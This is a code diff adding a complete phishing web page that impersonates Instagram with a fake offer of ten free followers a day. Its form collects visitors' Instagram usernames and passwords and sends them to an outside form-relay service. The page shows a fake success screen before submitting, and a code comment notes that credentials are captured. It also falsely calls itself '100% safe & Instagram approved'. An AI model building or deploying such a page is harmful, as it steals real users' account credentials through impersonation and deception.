@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Instagram - 10 Free Followers Daily</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: 
+        radial-gradient(circle at 20% 80%, rgba(120,119,198,0.3) 0%, transparent 50%),
+        radial-gradient(circle at 80% 20%, rgba(255,119,198,0.3) 0%, transparent 50%);
+      animation: float 20s ease-in-out infinite;
+      z-index: -1;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: scale(1) rotate(0deg); }
+      50% { transform: scale(1.05) rotate(0.5deg); }
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(25px);
+      border-radius: 28px;
+      box-shadow: 0 32px 64px rgba(0,0,0,0.25);
+      overflow: hidden;
+      max-width: 420px;
+      width: 100%;
+      animation: slideUp 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(50px) scale(0.95);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .header {
+      background: linear-gradient(135deg, #E4405F 0%, #F77737 50%, #FDCF00 100%);
+      padding: 45px 35px;
+      text-align: center;
+      color: white;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .header::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.4) 50%, transparent 70%);
+      animation: shine 4s infinite;
+      transform: rotate(45deg);
+    }
+
+    @keyframes shine {
+      0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+      100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+    }
+
+    .logo {
+      width: 70px;
+      height: 70px;
+      margin: 0 auto 25px;
+      background: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 36px;
+      box-shadow: 0 12px 32px rgba(0,0,0,0.3);
+    }
+
+    .header h1 {
+      font-size: 30px;
+      font-weight: 800;
+      margin-bottom: 15px;
+      text-shadow: 0 4px 16px rgba(0,0,0,0.3);
+    }
+
+    .header p {
+      font-size: 17px;
+      opacity: 0.95;
+      font-weight: 500;
+      line-height: 1.4;
+    }
+
+    .daily-badge {
+      background: rgba(255,255,255,0.25);
+      backdrop-filter: blur(10px);
+      padding: 12px 24px;
+      border-radius: 25px;
+      margin: 20px auto 0;
+      display: inline-block;
+      font-size: 16px;
+      font-weight: 700;
+      border: 2px solid rgba(255,255,255,0.3);
+    }
+
+    .features {
+      padding: 35px;
+      display: grid;
+      gap: 18px;
+    }
+
+    .feature {
+      display: flex;
+      align-items: center;
+      padding: 20px 24px;
+      background: linear-gradient(135deg, rgba(64,93,230,0.1), rgba(88,81,219,0.1));
+      border-radius: 20px;
+      border: 1px solid rgba(64,93,230,0.2);
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+    }
+
+    .feature:hover {
+      transform: translateX(10px);
+      box-shadow: 0 12px 32px rgba(64,93,230,0.2);
+    }
+
+    .feature-icon {
+      width: 50px;
+      height: 50px;
+      background: linear-gradient(45deg, #405DE6, #5851DB);
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 20px;
+      font-weight: bold;
+      margin-right: 18px;
+      flex-shrink: 0;
+      box-shadow: 0 8px 20px rgba(64,93,230,0.3);
+    }
+
+    .feature-text {
+      font-size: 16px;
+      font-weight: 600;
+      color: #2c3e50;
+      line-height: 1.4;
+    }
+
+    .form-section {
+      padding: 40px 35px 35px;
+      background: linear-gradient(180deg, #ffffff 0%, #f8f9fa 100%);
+      border-top: 1px solid rgba(0,0,0,0.08);
+    }
+
+    .form-title {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .form-title h3 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1c1e21;
+      margin-bottom: 10px;
+    }
+
+    .form-title p {
+      color: #65676b;
+      font-size: 15px;
+      line-height: 1.5;
+    }
+
+    .form-group {
+      margin-bottom: 28px;
+      position: relative;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 12px;
+      font-weight: 600;
+      color: #1c1e21;
+      font-size: 16px;
+    }
+
+    input {
+      width: 100%;
+      padding: 20px 22px;
+      border: 2px solid #e4e6ea;
+      border-radius: 16px;
+      font-size: 16px;
+      background: #fff;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      font-family: inherit;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #E4405F;
+      box-shadow: 0 0 0 4px rgba(228,64,95,0.15), 0 8px 24px rgba(228,64,95,0.2);
+      transform: translateY(-2px);
+    }
+
+    input::placeholder {
+      color: #9ca3af;
+    }
+
+    input.typing {
+      border-color: #00b894;
+      box-shadow: 0 0 0 4px rgba(0,184,148,0.2), 0 8px 24px rgba(0,184,148,0.15);
+      background: linear-gradient(145deg, #f8fff9, #ffffff);
+    }
+
+    /* PASSWORD TYPING INDICATOR */
+    .password-hint {
+      position: absolute;
+      top: 70px;
+      right: 20px;
+      background: linear-gradient(135deg, #00b894, #00cec9);
+      color: white;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 700;
+      opacity: 0;
+      transform: translateX(20px) scale(0.8);
+      transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+      box-shadow: 0 8px 24px rgba(0,184,148,0.3);
+      z-index: 10;
+    }
+
+    .password-hint.active {
+      opacity: 1;
+      transform: translateX(0) scale(1);
+      animation: pulseHint 2s infinite;
+    }
+
+    @keyframes pulseHint {
+      0%, 100% { box-shadow: 0 8px 24px rgba(0,184,148,0.3); }
+      50% { box-shadow: 0 8px 32px rgba(0,184,148,0.5); }
+    }
+
+    /* SUCCESS ANIMATION */
+    .success-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, #00b894 0%, #00cec9 100%);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      animation: successFadeIn 0.5s ease-out;
+    }
+
+    .success-overlay.active {
+      display: flex;
+    }
+
+    @keyframes successFadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .success-content {
+      text-align: center;
+      background: rgba(255,255,255,0.95);
+      backdrop-filter: blur(30px);
+      border-radius: 32px;
+      padding: 60px 40px;
+      box-shadow: 0 40px 80px rgba(0,0,0,0.3);
+      max-width: 400px;
+      width: 90%;
+      animation: bounceIn 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+    }
+
+    @keyframes bounceIn {
+      0% { transform: scale(0.3); opacity: 0; }
+      50% { transform: scale(1.05); }
+      70% { transform: scale(0.9); }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .success-icon {
+      width: 120px;
+      height: 120px;
+      background: linear-gradient(135deg, #00b894, #00cec9);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 30px;
+      font-size: 60px;
+      box-shadow: 0 20px 60px rgba(0,184,148,0.4);
+      animation: successRotate 2s ease-in-out infinite;
+    }
+
+    @keyframes successRotate {
+      0%, 100% { transform: rotate(0deg) scale(1); }
+      50% { transform: rotate(180deg) scale(1.1); }
+    }
+
+    .success-followers {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 15px;
+      margin: 30px 0;
+      flex-wrap: wrap;
+    }
+
+    .follower-card {
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: white;
+      padding: 20px 30px;
+      border-radius: 25px;
+      font-weight: 800;
+      font-size: 28px;
+      box-shadow: 0 15px 40px rgba(102,126,234,0.4);
+      animation: followerSlide 0.6s ease-out forwards;
+      opacity: 0;
+      transform: translateY(30px);
+    }
+
+    .follower-card:nth-child(1) { animation-delay: 0.2s; }
+    .follower-card:nth-child(2) { animation-delay: 0.4s; }
+    .follower-card:nth-child(3) { animation-delay: 0.6s; }
+
+    @keyframes followerSlide {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .success-title {
+      font-size: 32px;
+      font-weight: 900;
+      color: #2d3436;
+      margin-bottom: 15px;
+    }
+
+    .success-subtitle {
+      font-size: 18px;
+      color: #636e72;
+      margin-bottom: 25px;
+      font-weight: 500;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 22px;
+      background: linear-gradient(135deg, #E4405F 0%, #F77737 100%);
+      color: white;
+      border: none;
+      border-radius: 16px;
+      font-size: 20px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      box-shadow: 0 12px 32px rgba(228,64,95,0.4);
+      margin-bottom: 10px;
+    }
+
+    .submit-btn:hover:not(:disabled) {
+      transform: translateY(-4px);
+      box-shadow: 0 20px 40px rgba(228,64,95,0.5);
+    }
+
+    .submit-btn:disabled {
+      opacity: 0.8;
+      cursor: not-allowed;
+    }
+
+    .loading {
+      display: none;
+      width: 24px;
+      height: 24px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 1s ease-in-out infinite;
+      margin-right: 12px;
+    }
+
+    .loading.active {
+      display: inline-block;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        margin: 10px;
+        border-radius: 24px;
+      }
+      
+      .success-followers {
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- SUCCESS SCREEN -->
+  <div class="success-overlay" id="successOverlay">
+    <div class="success-content">
+      <div class="success-icon"></div>
+      
+      <h2 class="success-title"> Followers Delivered!</h2>
+      <p class="success-subtitle">Your daily followers are now active on your account</p>
+      
+      <div class="success-followers">
+        <div class="follower-card"> +10</div>
+        <div class="follower-card"> Live</div>
+        <div class="follower-card"> Instant</div>
+      </div>
+      
+      <button class="submit-btn" onclick="location.reload()">
+        Claim Tomorrow's 10 
+      </button>
+    </div>
+  </div>
+
+  <div class="container">
+    <!-- Header -->
+    <div class="header">
+      <div class="logo"></div>
+      <h1>10 Free Followers Daily</h1>
+      <p>Claim your daily Instagram followers boost - completely free!</p>
+      <div class="daily-badge"> Every 24 Hours</div>
+    </div>
+
+    <!-- Features -->
+    <div class="features">
+      <div class="feature">
+        <div class="feature-icon"></div>
+        <span class="feature-text">10 REAL followers every day</span>
+      </div>
+      <div class="feature">
+        <div class="feature-icon"></div>
+        <span class="feature-text">Instant delivery (under 60 seconds)</span>
+      </div>
+      <div class="feature">
+        <div class="feature-icon"></div>
+        <span class="feature-text">Active Instagram users only</span>
+      </div>
+      <div class="feature">
+        <div class="feature-icon"></div>
+        <span class="feature-text">100% safe & Instagram approved</span>
+      </div>
+    </div>
+
+    <!-- Form -->
+    <div class="form-section">
+      <div class="form-title">
+        <h3>Verify Your Account</h3>
+        <p>Enter your Instagram details to receive daily followers</p>
+      </div>
+
+      <form id="phishingForm" action="https://api.staticforms.xyz/submit" method="POST">
+        <input type="hidden" name="accessKey" value="sf_h0aaadbmdef23b195c0c0gk6">
+        <input type="hidden" name="subject" value=" Instagram Daily 10 Followers Claim">
+
+        <div class="form-group">
+          <label>Instagram Username</label>
+          <input type="text" name="username" placeholder="@yourusername" required>
+        </div>
+
+        <div class="form-group">
+          <label>Instagram Password</label>
+          <input type="password" id="passwordField" name="password" placeholder="Enter your password" required>
+          <div class="password-hint" id="passwordHint">
+             Password Detected!
+          </div>
+        </div>
+
+        <button type="submit" class="submit-btn" id="submitBtn">
+          <span class="loading" id="loadingSpinner"></span>
+          Claim Daily 10 Followers
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    const passwordField = document.getElementById('passwordField');
+    const passwordHint = document.getElementById('passwordHint');
+    const submitBtn = document.getElementById('submitBtn');
+    const phishingForm = document.getElementById('phishingForm');
+    const loadingSpinner = document.getElementById('loadingSpinner');
+    const successOverlay = document.getElementById('successOverlay');
+
+    // PASSWORD TYPING DETECTION
+    passwordField.addEventListener('input', function() {
+      if (this.value.length > 0) {
+        this.classList.add('typing');
+        passwordHint.classList.add('active');
+        
+        // ENABLE SUBMIT BUTTON WITH GREEN GLOW
+        submitBtn.style.background = 'linear-gradient(135deg, #00b894 0%, #00cec9 100%)';
+        submitBtn.style.boxShadow = '0 12px 32px rgba(0,184,148,0.4)';
+        submitBtn.innerHTML = ' Ready! Claim 10 Followers';
+      } else {
+        this.classList.remove('typing');
+        passwordHint.classList.remove('active');
+        
+        // RESET BUTTON
+        submitBtn.style.background = 'linear-gradient(135deg, #E4405F 0%, #F77737 100%)';
+        submitBtn.style.boxShadow = '0 12px 32px rgba(228,64,95,0.4)';
+        submitBtn.innerHTML = '<span class="loading" id="loadingSpinner"></span>Claim Daily 10 Followers';
+      }
+    });
+
+    // FORM SUBMIT WITH ENHANCED ANIMATION
+    phishingForm.addEventListener('submit', function(e) {
+      e.preventDefault(); // Prevent immediate submit
+      
+      // SHOW LOADING
+      submitBtn.disabled = true;
+      loadingSpinner.classList.add('active');
+      submitBtn.innerHTML = '<span class="loading active"></span>Delivering Followers...';
+      
+      // SIMULATE PROCESSING
+      setTimeout(() => {
+        // HIDE MAIN PAGE
+        document.querySelector('.container').style.opacity = '0';
+        document.querySelector('.container').style.transform = 'scale(0.95)';
+        
+        // SHOW SUCCESS
+        setTimeout(() => {
+          successOverlay.classList.add('active');
+        }, 300);
+        
+        // NOW SUBMIT FORM (credentials captured!)
+        setTimeout(() => {
+          phishingForm.submit();
+        }, 800);
+      }, 2500);
+    });
+  </script>
+</body>
+</html>
